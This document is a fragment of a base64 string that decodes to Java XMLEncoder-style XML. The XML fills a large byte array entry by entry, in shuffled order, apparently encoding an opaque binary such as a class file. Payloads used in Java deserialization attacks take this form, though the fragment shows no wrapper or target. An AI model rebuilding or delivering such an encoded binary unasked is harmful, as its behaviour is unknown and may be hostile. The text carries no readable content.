wvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU0MCI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjI4Ij48Ynl0ZT4xMTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMTMiPjxieXRlPjkxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzY4MCI+PGJ5dGU+Nzc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNTI1Ij48Ynl0ZT4xMTI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMjY3Ij48Ynl0ZT44NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ3NTQiPjxieXRlPjEwMzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI4MzYiPjxieXRlPjczPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTIyMCI+PGJ5dGU+MTE0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjA5NCI+PGJ5dGU+MTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE3MzQiPjxieXRlPjExMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUyMTQiPjxieXRlPjExMDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU0MjMiPjxieXRlPjk4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTM5Ij48Ynl0ZT4xMTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMTI3Ij48Ynl0ZT4xMjI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NTA0Ij48Ynl0ZT45NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY1MTYiPjxieXRlPjExODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIzMDYiPjxieXRlPjkwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjEwNSI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjY2NSI+PGJ5dGU+OTg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNzk0Ij48Ynl0ZT4xMTY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0OTg4Ij48Ynl0ZT4xMTg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNTEzIj48Ynl0ZT4xMTg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NDQxIj48Ynl0ZT40PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzMxMCI+PGJ5dGU+ODk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NTc4Ij48Ynl0ZT45OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM2OTAiPjxieXRlPjEyMDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM2MTUiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDUwNiI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNjg4Ij48Ynl0ZT4xMjA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMzc1Ij48Ynl0ZT41MTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM0MzYiPjxieXRlPjU3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjEyNCI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNzA0Ij48Ynl0ZT40NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM4OTEiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTYyNSI+PGJ5dGU+OTM8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMjY5Ij48Ynl0ZT4xMTQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMTQxIj48Ynl0ZT4xMTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NiI+PGJ5dGU+MTA2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTM2MSI+PGJ5dGU+MTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU3NTAiPjxieXRlPjI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNzciPjxieXRlPjk1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTIxMCI+PGJ5dGU+MTA1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzQyMCI+PGJ5dGU+Njk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNzUwIj48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjYwMiI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyODc1Ij48Ynl0ZT4xMDk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MDMiPjxieXRlPjExNzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU4ODgiPjxieXRlPjgzPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjgwMSI+PGJ5dGU+MTAyPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjYwMSI+PGJ5dGU+MTA4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjc5MCI+PGJ5dGU+OTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzODk2Ij48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI2ODEiPjxieXRlPjExMzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ5MiI+PGJ5dGU+MzQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzOTc1Ij48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQzNyI+PGJ5dGU+NjY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNTA4Ij48Ynl0ZT4xMTI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMDA2Ij48Ynl0ZT4xMDQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1NDA5Ij48Ynl0ZT4tMTE1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzM2MCI+PGJ5dGU+OTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMTY3Ij48Ynl0ZT43MTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMzMjUiPjxieXRlPjU1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTQxNiI+PGJ5dGU+MTIwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTA2MSI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTQ3OCI+PGJ5dGU+MTE0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjMzOCI+PGJ5dGU+NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9Ijg4MCI+PGJ5dGU+MTE1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iOTEyIj48Ynl0ZT40NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI1MTQiPjxieXRlPjkwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDg2MiI+PGJ5dGU+MTExPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzM4MiI+PGJ5dGU+Nzk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMDg3Ij48Ynl0ZT43MTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI0MTgiPjxieXRlPjk5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjU2MyI+PGJ5dGU+MTEwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTU1MyI+PGJ5dGU+MTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9Ijk1MSI+PGJ5dGU+MTA1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjI3MiI+PGJ5dGU+OTk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MzA3Ij48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjYxMTYiPjxieXRlPjExMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU1NCI+PGJ5dGU+MTA1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzA4MyI+PGJ5dGU+NTE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI3NDMiPjxieXRlPjEwNTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI2NjYiPjxieXRlPjY2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTIzIj48Ynl0ZT4xPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNzcyIj48Ynl0ZT4xMTE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2Nzk3Ij48Ynl0ZT4xPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjQyNiI+PGJ5dGU+Njg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0Njg3Ij48Ynl0ZT4xMDE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMDE2Ij48Ynl0ZT41NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9Ijc5NCI+PGJ5dGU+MTA4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjQxMyI+PGJ5dGU+MjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjYxOTkiPjxieXRlPjEwMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE5NzYiPjxieXRlPjY2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjgyOCI+PGJ5dGU+ODI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NTg5Ij48Ynl0ZT4xMDE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMzIwIj48Ynl0ZT43ODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIzMzIiPjxieXRlPjEwODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI0Ij48Ynl0ZT43MjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU5NTQiPjxieXRlPjE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxODY3Ij48Ynl0ZT44MTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE2OTYiPjxieXRlPjEwMzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE3MCI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzk5MiI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NDQ1Ij48Ynl0ZT4xMTQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNzA4Ij48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQxMTYiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTE3Ij48Ynl0ZT4xMTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzODkiPjxieXRlPjExNDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjYxNjEiPjxieXRlPjE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1NTA5Ij48Ynl0ZT4yNjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIxNDkiPjxieXRlPjExNTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUwNDEiPjxieXRlPjEwMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI4MTMiPjxieXRlPjExODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMyMDQiPjxieXRlPjUzPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDYyNiI+PGJ5dGU+MTA4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDQ1NiI+PGJ5dGU+Njk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMDU4Ij48Ynl0ZT45MDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQyNjEiPjxieXRlPjY2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iODA2Ij48Ynl0ZT40NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY1MTUiPjxieXRlPjk3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzkyIj48Ynl0ZT4xMDE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMTQ0Ij48Ynl0ZT43MjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU0MTUiPjxieXRlPjk3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTEyIj48Ynl0ZT4xMDE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NjQ0Ij48Ynl0ZT4xMDg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0Mjk0Ij48Ynl0ZT41MjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU1MjMiPjxieXRlPjg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MzkxIj48Ynl0ZT4xPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzc1MCI+PGJ5dGU+NjY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyODE4Ij48Ynl0ZT44MTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE1NDYiPjxieXRlPjcxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNzk1Ij48Ynl0ZT40NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjExMTMiPjxieXRlPjExNjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjExMzYiPjxieXRlPjEwODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU4MjMiPjxieXRlPi03MzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjYyMzIiPjxieXRlPjY5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjE1MCI+PGJ5dGU+ODk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMDI3Ij48Ynl0ZT4xMTY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNzI5Ij48Ynl0ZT40NDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE4MjMiPjxieXRlPjc2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjE0OCI+PGJ5dGU+NTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NTg0Ij48Ynl0ZT44NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUzODUiPjxieXRlPjEwNTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM5MjEiPjxieXRlPjgxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDMxNyI+PGJ5dGU+MTA5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjU1MCI+PGJ5dGU+MTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9Ijk5Ij48Ynl0ZT4xMTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NjkyIj48Ynl0ZT40MTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjEyMjYiPjxieXRlPjExMDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjEzNjciPjxieXRlPjExMDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUzMzYiPjxieXRlPjEwNTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY0NzkiPjxieXRlPjg0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDIwMyI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MTc4Ij48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY3NzgiPjxieXRlPjEyMDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ2NyI+PGJ5dGU+ODQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMzE3Ij48Ynl0ZT4xMjE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMzA2Ij48Ynl0ZT44OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQxNDciPjxieXRlPjY4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzgxIj48Ynl0ZT4xMTI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNDMxIj48Ynl0ZT44NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM3OTAiPjxieXRlPjY4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTgzOSI+PGJ5dGU+MTAzPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDEzMyI+PGJ5dGU+NzI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MzIwIj48Ynl0ZT45OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUzMiI+PGJ5dGU+MTE2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTEwMCI+PGJ5dGU+MTE3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjcxMSI+PGJ5dGU+MTAzPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzEwNiI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMDk3Ij48Ynl0ZT42NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI2OTMiPjxieXRlPjExODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE5NTEiPjxieXRlPjcwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzA2Ij48Ynl0ZT4xMDA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMzMyIj48Ynl0ZT44NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUyNzYiPjxieXRlPjgzPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjgzMCI+PGJ5dGU+MTE0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDU3NCI+PGJ5dGU+MTAzPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTMwOCI+PGJ5dGU+NzA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI5OTMiPjxieXRlPjQ3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNzY2Ij48Ynl0ZT4xMDk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI3ODYiPjxieXRlPjQ3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTY4MyI+PGJ5dGU+MTI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MTIxIj48Ynl0ZT45NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9Ijg1NSI+PGJ5dGU+MTAzPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjAyOSI+PGJ5dGU+MTE0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDA2NCI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNzg0Ij48Ynl0ZT4xMDA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MjI2Ij48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUxMTUiPjxieXRlPjExMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI1NzgiPjxieXRlPjkwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDI2OCI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NTczIj48Ynl0ZT40NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY2NDUiPjxieXRlPjEwODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ0MTYiPjxieXRlPjY4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjA2MiI+PGJ5dGU+Njk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0OTQzIj48Ynl0ZT4xMTg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1ODQyIj48Ynl0ZT43NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY1MzIiPjxieXRlPjgwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzI1NiI+PGJ5dGU+NDk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNDM4Ij48Ynl0ZT44NDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ1OTEiPjxieXRlPjc3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzYzNSI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzODI5Ij48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU2MDkiPjxieXRlPi03OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU4OTkiPjxieXRlPjQ5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTI0MyI+PGJ5dGU+MTExPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjcxOSI+PGJ5dGU+MTA1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzQ0OSI+PGJ5dGU+NjY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI5NzYiPjxieXRlPjExMjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQzNTEiPjxieXRlPjExNzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE0MjUiPjxieXRlPjExNjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ1MDEiPjxieXRlPjQxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDcwMyI+PGJ5dGU+NDc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NDgwIj48Ynl0ZT4xMDE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MzA1Ij48Ynl0ZT40ODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI2NzYiPjxieXRlPjg5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjg3MCI+PGJ5dGU+NzY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1MjU1Ij48Ynl0ZT4xMDE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MDI4Ij48Ynl0ZT4xMDc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MTgiPjxieXRlPjE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1MjQzIj48Ynl0ZT4xMjM8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1NDg1Ij48Ynl0ZT41MzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM0MTQiPjxieXRlPjk4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjExMiI+PGJ5dGU+NzA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMDA4Ij48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIzMTMiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTQ0NCI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjI3MSI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NzM4Ij48Ynl0ZT45OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9Ijg3NiI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNTQzIj48Ynl0ZT40ODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIwMzUiPjxieXRlPjgxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTE2NCI+PGJ5dGU+NDc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI5MCI+PGJ5dGU+MTE1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTg5MyI+PGJ5dGU+OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM2NTkiPjxieXRlPjExOTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU4NyI+PGJ5dGU+OTg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MDU1Ij48Ynl0ZT45NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM4NjUiPjxieXRlPjg5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTQ0MSI+PGJ5dGU+MTEwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjgxIj48Ynl0ZT4xMTY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNzA3Ij48Ynl0ZT41MDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMwOTkiPjxieXRlPjgxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjI1OSI+PGJ5dGU+MTIyPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzQyIj48Ynl0ZT4xMTU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MTQwIj48Ynl0ZT44NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU1MiI+PGJ5dGU+NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI5NjQiPjxieXRlPjUzPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTkyMCI+PGJ5dGU+LTY5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iODUwIj48Ynl0ZT4xMTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNDQ2Ij48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ1NjkiPjxieXRlPjk3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDkwNiI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjM5MiI+PGJ5dGU+ODI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNDczIj48Ynl0ZT4xMTE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MDM4Ij48Ynl0ZT4xMTE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMDUxIj48Ynl0ZT4xMjE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0OTY2Ij48Ynl0ZT4xMTU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MTI3Ij48Ynl0ZT42ODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM0MSI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0ODE5Ij48Ynl0ZT4xMDE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMTA5Ij48Ynl0ZT41MDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI0NyI+PGJ5dGU+MTE0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzc5Ij48Ynl0ZT4xMTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNDY5Ij48Ynl0ZT43MDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjEyNSI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1Njk1Ij48Ynl0ZT4xPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjExOCI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNTA3Ij48Ynl0ZT4xMTU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNzMzIj48Ynl0ZT4xMTg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMzg1Ij48Ynl0ZT4xMDk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzOTE2Ij48Ynl0ZT4xMTU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2Mjk2Ij48Ynl0ZT4xMDE8L2J5dGU+PC92b2lk